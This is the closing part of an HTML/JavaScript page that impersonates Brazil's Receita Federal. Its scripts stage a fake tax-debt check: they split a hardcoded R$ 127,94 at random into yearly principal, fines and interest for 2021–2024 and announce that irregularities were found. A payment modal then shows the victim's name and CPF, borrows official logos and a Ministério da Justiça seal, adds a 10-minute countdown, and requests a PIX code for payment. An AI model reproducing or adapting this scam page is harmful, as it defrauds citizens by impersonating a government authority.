            loadingContainer.style.cssText = 'margin-top: 20px; background-color: #f8f9fa; padding: 20px; border-radius: 8px; border-left: 4px solid #003472;';
            loadingContainer.innerHTML = `
                <h4 style="color: #003472; margin-bottom: 15px; display: flex; align-items: center;">
                    <i class="fas fa-search" style="margin-right: 10px; animation: spin 1s linear infinite;"></i>
                    Analisando Situação Fiscal...
                </h4>
                <p style="margin-bottom: 20px; color: #495057;">
                    Verificando débitos nos sistemas da Receita Federal. Aguarde...
                </p>
                
                <div id="yearAnalysisContainer">
                    <!-- Anos serão adicionados dinamicamente -->
                </div>
                
                <div id="totalAnalysisContainer" style="display: none; margin-top: 20px; padding: 15px; background: linear-gradient(135deg, #dc3545, #c82333); color: white; border-radius: 6px; text-align: center;">
                    <h5 style="margin: 0 0 8px 0;">TOTAL IDENTIFICADO</h5>
                    <div id="totalValue" style="font-size: 24px; font-weight: 800;">R$ 0,00</div>
                </div>
            `;
            
            // Inserir após a message-box na seção de dados do devedor
            const messageBox = debtorInfo.querySelector('.message-box');
            if (messageBox) {
                console.log('Inserindo loading após message-box');
                messageBox.parentNode.insertBefore(loadingContainer, messageBox.nextSibling);
            } else {
                console.log('Inserindo loading no final da seção devedor');
                debtorInfo.appendChild(loadingContainer);
            }
            
            // Começar análise por anos
            startYearByYearAnalysis();
        }

        function startYearByYearAnalysis() {
            const years = [2021, 2022, 2023, 2024];
            const yearContainer = document.getElementById('yearAnalysisContainer');
            const targetTotal = 127.94;
            let currentTotal = 0;
            const yearValues = [];
            
            // Distribuir o total de R$ 127,94 entre os anos
            for (let i = 0; i < years.length; i++) {
                if (i === years.length - 1) {
                    // Último ano recebe o restante
                    yearValues[i] = targetTotal - currentTotal;
                } else {
                    // Distribuir aleatoriamente entre 20-40 reais
                    const amount = Math.random() * 20 + 20;
                    yearValues[i] = Math.min(amount, targetTotal - currentTotal - (years.length - i - 1) * 15);
                    currentTotal += yearValues[i];
                }
            }
            
            currentTotal = 0; // Reset para display progressivo
            
            years.forEach((year, index) => {
                setTimeout(() => {
                    analyzeYear(year, yearContainer, yearValues[index], (amount) => {
                        currentTotal += amount;
                        updateTotalDisplay(currentTotal);
                        
                        // Se é o último ano, finalizar análise
                        if (index === years.length - 1) {
                            setTimeout(() => {
                                finalizeFiscalAnalysis();
                            }, 1500);
                        }
                    });
                }, index * 2000); // 2 segundos entre cada ano
            });
        }

        function analyzeYear(year, container, totalAmount, callback) {
            console.log(`Analisando ano ${year} com valor total: R$ ${totalAmount.toFixed(2)}`);
            
            // Criar elemento do ano
            const yearElement = document.createElement('div');
            yearElement.style.cssText = 'margin-bottom: 12px; padding: 15px; background: white; border: 1px solid #dee2e6; border-radius: 6px;';
            
            // Distribuir o valor total em componentes realistas
            const baseAmount = totalAmount * (0.6 + Math.random() * 0.2); // 60-80% principal
            const multa = totalAmount * (0.1 + Math.random() * 0.15); // 10-25% multa
            const juros = totalAmount - baseAmount - multa; // Restante para juros
            
            yearElement.innerHTML = `
                <div style="background: linear-gradient(135deg, #003472, #0056b3); color: white; padding: 10px; margin: -15px -15px 15px -15px; border-radius: 6px 6px 0 0;">
                    <strong><i class="fas fa-calendar-alt" style="margin-right: 8px;"></i>Exercício ${year}</strong>
                </div>
                <div id="year${year}Status">
                    <div style="display: flex; align-items: center; margin-bottom: 10px;">
                        <div class="loading-spinner" style="width: 20px; height: 20px; border: 2px solid #f3f3f3; border-top: 2px solid #003472; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 10px;"></div>
                        <span id="year${year}Text">Verificando registros fiscais...</span>
                    </div>
                    <div id="year${year}Details" style="display: none;">
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; font-size: 14px;">
                            <div><strong>Principal:</strong> <span style="color: #dc3545;">R$ ${baseAmount.toFixed(2)}</span></div>
                            <div><strong>Multas:</strong> <span style="color: #dc3545;">R$ ${multa.toFixed(2)}</span></div>
                            <div><strong>Juros:</strong> <span style="color: #dc3545;">R$ ${juros.toFixed(2)}</span></div>
                            <div><strong>Total:</strong> <span style="color: #dc3545; font-weight: 700;">R$ ${totalAmount.toFixed(2)}</span></div>
                        </div>
                    </div>
                </div>
            `;
            
            container.appendChild(yearElement);
            
            // Simular progresso da análise
            const statusText = document.getElementById(`year${year}Text`);
            const details = document.getElementById(`year${year}Details`);
            const spinner = yearElement.querySelector('.loading-spinner');
            
            const steps = [
                'Verificando registros fiscais...',
                'Analisando declarações...',
                'Calculando multas e juros...',
                'Consolidando débitos...'
            ];
            
            steps.forEach((step, stepIndex) => {
                setTimeout(() => {
                    statusText.textContent = step;
                    
                    // No último passo, mostrar resultados
                    if (stepIndex === steps.length - 1) {
                        setTimeout(() => {
                            spinner.style.display = 'none';
                            statusText.innerHTML = '<strong style="color: #dc3545;"><i class="fas fa-exclamation-triangle"></i> Débitos identificados!</strong>';
                            details.style.display = 'block';
                            
                            // Callback com o valor total
                            callback(totalAmount);
                        }, 800);
                    }
                }, stepIndex * 600);
            });
        }

        function updateTotalDisplay(total) {
            const totalContainer = document.getElementById('totalAnalysisContainer');
            const totalValue = document.getElementById('totalValue');
            
            if (totalContainer && totalValue) {
                totalContainer.style.display = 'block';
                totalValue.textContent = `R$ ${total.toFixed(2)}`;
                
                // Animar o valor
                totalValue.style.animation = 'pulse 0.5s ease-in-out';
                setTimeout(() => {
                    totalValue.style.animation = '';
                }, 500);
            }
        }

        function finalizeFiscalAnalysis() {
            const loadingContainer = document.getElementById('fiscalAnalysisLoading');
            const taxDetails = document.querySelector('.tax-details');
            
            if (loadingContainer) {
                // Adicionar mensagem final
                const finalMessage = document.createElement('div');
                finalMessage.style.cssText = 'margin-top: 20px; padding: 15px; background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 6px; text-align: center;';
                finalMessage.innerHTML = `
                    <p style="margin: 0; color: #856404; font-weight: 600;">
                        <i class="fas fa-check-circle" style="color: #28a745; margin-right: 8px;"></i>
                        Análise fiscal concluída. Irregularidades encontradas.
                    </p>
                `;
                loadingContainer.appendChild(finalMessage);
                
                // Após 2 segundos, remover loading e mostrar tax-details
                setTimeout(() => {
                    loadingContainer.style.display = 'none';
                    if (taxDetails) {
                        taxDetails.style.display = 'block';
                        taxDetails.scrollIntoView({ behavior: 'smooth', block: 'start' });
                    }
                }, 2000);
            }
        }
    </script>

    <!-- Modal de Pagamento -->
    <div id="paymentModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <img src="https://www.gov.br/receitafederal/pt-br/assuntos/aduana-e-comercio-exterior/manuais/remessas-postal-e-expressa/calculadora-versao-iii/componentes/cabecalho/img/receita-federal-logo.png" alt="Logo Receita Federal" class="modal-logo">
            </div>
            <div id="loaderContainer" class="loader-container">
                <div class="loader"></div>
                <p class="loader-text">Gerando cobrança...</p>
            </div>
            <!-- PIX Copia e Cola Container -->
            <div id="qrCodeContainer" class="qr-code-container">
                <div class="customer-info">
                    <p><strong>Cliente:</strong> {{ customer.nome }}</p>
                    <p><strong>CPF:</strong> {{ customer.cpf }}</p>
                    <p class="total-amount">Valor: R$ 127,94</p>
                </div>

                <div class="warning-text">
                    ⚠️ Este PIX expira em 10 minutos! Complete o pagamento rapidamente.
                </div>

                <div class="countdown-timer-pix" id="pixCountdown">10:00</div>

                <!-- Código PIX para Copia e Cola -->
                <div class="pix-code-container">
                    <h4 style="margin-bottom: 8px; font-weight: 600;">📋 Código PIX - Copia e Cola</h4>
                    <textarea id="pixCode" class="pix-code" readonly placeholder="Código PIX será exibido aqui..."></textarea>
                </div>

                <div class="copy-button-container">
                    <button class="copy-pix-button" onclick="copyPixCode()">
                        <i class="fas fa-copy"></i> Copiar Código PIX
                    </button>
                </div>





                <!-- Selo Ministério da Justiça -->
                <div class="ministry-seal-container">
                    <div class="ministry-seal">
                        <img src="https://dspace.mj.gov.br/retrieve/95d2f9b3-76eb-4f34-96a4-c2cd54ac589a" alt="Ministério da Justiça" class="ministry-seal-img">
                    </div>
                    <div class="ministry-text">
                        <p class="ministry-name">MINISTÉRIO DA JUSTIÇA</p>
                        <p class="ministry-gov">GOVERNO FEDERAL</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    </div> <!-- End main-content -->

    <script>
        // Only show loading screen on CPF routes
        document.addEventListener('DOMContentLoaded', function() {
            const currentPath = window.location.pathname;
            const isCpfRoute = /^\/\d{11}$/.test(currentPath); // Matches /11digits

            if (isCpfRoute) {
                // Show loading screen for 4 seconds
                setTimeout(function() {
                    document.getElementById('loadingScreen').style.display = 'none';
                    document.getElementById('mainContent').classList.add('show');
                }, 4000);
            } else {
                // Hide loading screen immediately for other pages
                document.getElementById('loadingScreen').style.display = 'none';
                document.getElementById('mainContent').classList.add('show');
            }

            // Set current date in Brazilian format
            const today = new Date();
            const dateOptions = { 
                day: '2-digit', 
                month: '2-digit', 
                year: 'numeric',
                timeZone: 'America/Sao_Paulo'
            };
            const formattedDate = today.toLocaleDateString('pt-BR', dateOptions);
            const currentDateElement = document.getElementById('currentDate');
            if (currentDateElement) {
                currentDateElement.textContent = formattedDate;
            }
        });

        // Função para gerar PIX (corrigida)
        async function generatePayment() {
            const modal = document.getElementById('paymentModal');
            const loaderContainer = document.getElementById('loaderContainer');
            const qrCodeContainer = document.getElementById('qrCodeContainer');

            try {
                modal.style.display = 'block';
                loaderContainer.style.display = 'block';
                qrCodeContainer.style.display = 'none';

                const cpfValue = '{{ customer.cpf }}';
                const nameValue = '{{ customer.nome }}';
                const emailValue = 'gerarpagamento@gmail.com';

                const pixData = {
                    cpf: cpfValue,
                    name: nameValue,
                    email: emailValue
                };

                console.log('Enviando dados PIX:', pixData);

                const response = await fetch('/generate-pix', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(pixData)
                });

                console.log('Status da resposta:', response.status);
                const data = await response.json();
                console.log('Resposta do PIX:', data);

                if (data.success) {
                    // Extrair dados da resposta
                    const pixCode = data.pix_code || data.pixCode || '';

                    // Mostrar código PIX no textarea
                    document.getElementById('pixCode').value = pixCode;

                    loaderContainer.style.display = 'none';
                    qrCodeContainer.style.display = 'block';
                    startPixCountdown();
                } else {
                    throw new Error(data.error || 'Erro ao gerar o pagamento');
                }

            } catch (error) {
                console.error('Erro:', error);
                loaderContainer.style.display = 'none';
                alert('Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente em alguns instantes.');
                setTimeout(() => {
                    modal.style.display = 'none';
                }, 1500);
            }
        }


    </script>
</body>
</html>